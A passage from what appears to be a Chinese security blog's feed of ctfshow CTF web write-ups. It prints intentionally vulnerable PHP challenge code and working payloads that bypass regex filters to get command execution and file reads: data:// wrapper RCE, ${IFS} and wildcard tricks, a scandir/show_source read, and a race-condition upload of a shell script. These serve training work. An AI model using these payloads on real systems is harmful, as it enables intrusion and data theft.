class="string">&quot;+&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$num</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>) <span class="keyword">and</span> <span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">trim</span>(<span class="variable">$num</span>)!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">filter</span>(<span class="variable">$num</span>)==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hacker!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!!!&quot;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">一些php特性奇奇怪怪的绕过~</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>对sqlmap时间盲注的研究</title>
    <link href="https://github.com/Eviden0/new-webpage/posts/9a87762d.html"/>
    <id>https://github.com/Eviden0/new-webpage/posts/9a87762d.html</id>
    <published>2024-09-09T00:03:00.000Z</published>
    <updated>2024-09-09T14:27:47.520Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><strong>最近在猛刷sql注入的题,大部分类型的题目已经刷完,时间盲注这块还没深入研究,自然也就对sqlmap的检测思路进行学习学习!</strong></p></blockquote><p><a href="https://www.freebuf.com/sectool/222967.html">#参考1</a></p><p><a href="https://mp.weixin.qq.com/s/nCvrk6NEb_lDv7MXdXn3vA">#参考2</a></p><p><a href="https://www.cnblogs.com/hongfei/p/sqlmap-time-based-blind.html">sqlmap代码示例</a></p><p><a href="https://blog.csdn.net/q20010619/article/details/122243790">sqlmap参考资料汇总</a></p><p>实际案子的时候遇到了一个注入，过狗可以使用<code>sqlmap</code>，但是是基于时间的注入和限制频率需要使用<code>--delay</code>参数，本来就是延时再加上<code>--delay</code>等的心力憔悴。所有有了下面介绍使用<code>sqlmap</code>利用<code>DNS</code>进行<code>oob(out of band)</code>注入，快速出数据。一般情况下仅适用于<code>windows</code>平台</p><p><code>对mysql版本有关系,且需要开启文件权限!</code></p>]]></content>
    
    
    <summary type="html">对sqlmap时间盲注的研究,意外之喜!</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>利用pearcmd.php本地文件包含（LFI）</title>
    <link href="https://github.com/Eviden0/new-webpage/posts/a03e7e5b.html"/>
    <id>https://github.com/Eviden0/new-webpage/posts/a03e7e5b.html</id>
    <published>2024-09-08T07:01:00.000Z</published>
    <updated>2024-09-08T08:01:53.626Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://tttang.com/archive/1312/">P牛的文章</a></p><p>\1. <a href="https://tttang.com/archive/1312/">https://tttang.com/archive/1312/</a><br> \2. <a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a><br> \3. <a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a><br> \4. <a href="https://dl.packetstormsecurity.net/papers/general/LFI_With_PHPInfo_Assitance.pdf">https://dl.packetstormsecurity.net/papers/general/LFI_With_PHPInfo_Assitance.pdf</a></p>]]></content>
    
    
    <summary type="html">利用pearcmd.php本地文件包含（LFI）</summary>
    
    
    
    
    <category term="漏洞复现" scheme="https://github.com/Eviden0/new-webpage/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow03</title>
    <link href="https://github.com/Eviden0/new-webpage/posts/3502c2fc.html"/>
    <id>https://github.com/Eviden0/new-webpage/posts/3502c2fc.html</id>
    <published>2024-09-08T05:46:00.000Z</published>
    <updated>2024-09-11T07:46:47.619Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h2 id="刷题"><a href="#刷题" class="headerlink" title="刷题"></a>刷题</h2><p><strong>web32</strong></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:56:31</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><blockquote><p><strong>37</strong></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 06:13:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//直接rce即可</span></span><br><span class="line">?c=data:<span class="comment">//text/plain,&lt;?php system(&#x27;cat fl*&#x27;)?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>web40</strong>,无参数读取文件</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//首先介绍一下这几个函数</span></span><br><span class="line"><span class="title function_ invoke__">getpwd</span>() - 获取当前php所在目录</span><br><span class="line"><span class="title function_ invoke__">scandir</span>() - 列出指定路径中所有的文件和目录</span><br><span class="line"><span class="title function_ invoke__">array_reverse</span>() - 返回单元顺序相反的数组</span><br><span class="line"><span class="title function_ invoke__">current</span>() - 返回数组中的当前值</span><br><span class="line"><span class="title function_ invoke__">end</span>() - 将数组的内部指针指向最后一个单元</span><br><span class="line"><span class="title function_ invoke__">prev</span>() - 将数组的内部指针倒回一位</span><br><span class="line"><span class="title function_ invoke__">reset</span>() - 将数组的内部指针指向第一个单元</span><br><span class="line"><span class="title function_ invoke__">each</span>() - 返回数组中当前的键／值对并将数组指针向前移动一步</span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// var_dump(scandir(getcwd())) ;</span></span><br><span class="line"><span class="variable">$transport</span>=<span class="keyword">array</span>(<span class="string">&#x27;foot&#x27;</span>,<span class="string">&#x27;bike&#x27;</span>,<span class="string">&#x27;car&#x27;</span>,<span class="string">&#x27;plane&#x27;</span>);</span><br><span class="line"><span class="comment">// $mode=current($transport);   // $mode = &#x27;foot&#x27;;</span></span><br><span class="line"><span class="variable">$mode</span> = <span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">next</span>(<span class="variable">$transport</span>));    <span class="comment">// $mode = &#x27;bike&#x27;;</span></span><br><span class="line"><span class="comment">// $mode = next($transport);    // $mode = &#x27;car&#x27;; 两次next</span></span><br><span class="line"><span class="comment">// $mode = prev($transport);    // $mode = &#x27;bike&#x27;; 一次prev 往前</span></span><br><span class="line"><span class="comment">// $mode = end($transport);     // $mode = &#x27;plane&#x27;; 直接取得最后一个</span></span><br><span class="line"><span class="comment">//能直接用的就是 current() next() end()</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$mode</span>;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">查看当前工作目录<span class="title function_ invoke__">getcwd</span>()，扫描当前目录及文件<span class="string">&quot;scandir()&quot;</span>输出 为数组，flag.php 在倒数第二个个位置那就数组倒置<span class="title function_ invoke__">array_revers</span>()，变为正数第二，在使用<span class="title function_ invoke__">next</span>()函数指向从第一个指向第二个（及指向flag.php）,最后使用show_source（）查看文件的内容 ?c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>())))));</span><br><span class="line"></span><br><span class="line">url+?c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">getcwd</span>()); ===&gt; /<span class="keyword">var</span>/www/html</span><br><span class="line"></span><br><span class="line">url+?c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>())); ===&gt; <span class="title function_ invoke__">Array</span> ( [<span class="number">0</span>] =&gt; . [<span class="number">1</span>] =&gt; .. [<span class="number">2</span>] =&gt; flag.php [<span class="number">3</span>] =&gt; index.php )</span><br><span class="line"></span><br><span class="line">url+?c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>()))); ==&gt; <span class="title function_ invoke__">Array</span> ( [<span class="number">0</span>] =&gt; index.php [<span class="number">1</span>] =&gt; flag.php [<span class="number">2</span>] =&gt; .. [<span class="number">3</span>] =&gt; . )</span><br><span class="line"></span><br><span class="line">url+?c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>())))); ==&gt; flag.php</span><br><span class="line"></span><br><span class="line">url+?c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>()))))); ==&gt; <span class="variable">$flag</span>=<span class="string">&quot;ctfshow&#123;eca2e7df-d196-4b71-9632-ad4d32e194d3&#125;&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p><strong>Web51</strong></p></blockquote><p><code>看看常见过滤</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没过滤<code>nl</code>,<code>vi</code>,<code>tac</code>命令</p><p>空格用<code>&lt;</code>绕过,后面继续用<code>||</code>截断即可!</p><p>payload:<code>c=vi&lt;fla\g.php||</code>,<code>c=nl&lt;fla\g.php||</code></p><blockquote><p><strong>Web52</strong> 这个过滤有点哈人!</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Lazzaro</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 19:43:42</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">善用?占位符</span><br><span class="line">/bin/ca?<span class="variable">$&#123;IFS&#125;</span>???g.php</span><br><span class="line">这里有个小trick,里面直接用ca?不能直接定位到<span class="built_in">cat</span>命令,/bin/ca?可以!</span><br><span class="line">包括/bin/n? 应该也是可以直接定位到<span class="built_in">nl</span>命令的!,不过不过,这里的<span class="built_in">nl</span>并非我们想要的<span class="built_in">nl</span>命令!!!</span><br><span class="line">我们想要的<span class="built_in">nl</span>命令在 /usr/bin/nl </span><br><span class="line">┌──(root㉿kali)-[/var/www/html]</span><br><span class="line">└─# <span class="built_in">type</span> <span class="built_in">nl</span>        </span><br><span class="line"><span class="built_in">nl</span> is /usr/bin/nl 可以这样查询!</span><br><span class="line"></span><br><span class="line">甚至可以这样的姿势?---&gt;/??n/??t<span class="variable">$&#123;IFS&#125;</span>????????</span><br><span class="line"></span><br><span class="line">当然这题有漏网之鱼</span><br><span class="line">c=grep<span class="variable">$&#123;IFS&#125;</span>-r<span class="variable">$&#123;IFS&#125;</span><span class="string">&#x27;ctfshow&#x27;</span><span class="variable">$&#123;IFS&#125;</span>.</span><br></pre></td></tr></table></figure><blockquote><p><strong>Web55</strong> bash无字母rce</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Lazzaro</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 20:03:51</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><blockquote><p><strong>Web56</strong>,条件竞争写入/tmp shell脚本并执行</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Lazzaro</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>我勒个过滤,只能耍赖咯!</code></p><p>数据包:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST /?c=.%20/???/????????[@-[] HTTP/1.1</span><br><span class="line">Host: 242588a5-a627-4694-98e4-4d7daecf188a.challenge.ctf.show</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/jxl,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Cookie: PHPSESSID=86vjn4hae6i2238p0rlc5bgcv1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Sec-GPC: 1</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------123</span><br><span class="line"></span><br><span class="line">----------123</span><br><span class="line">Content-Disposition:form-data;name=&quot;file&quot;;filename=&quot;1.txt&quot;</span><br><span class="line"></span><br><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">cat flag.php</span><br><span class="line">----------123--</span><br></pre></td></tr></table></figure><blockquote><p><strong>Web57</strong> 全过滤</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-08 01:02:56</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 还能炫的动吗？</span></span><br><span class="line"><span class="comment">//flag in 36.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat &quot;</span>.<span class="variable">$c</span>.<span 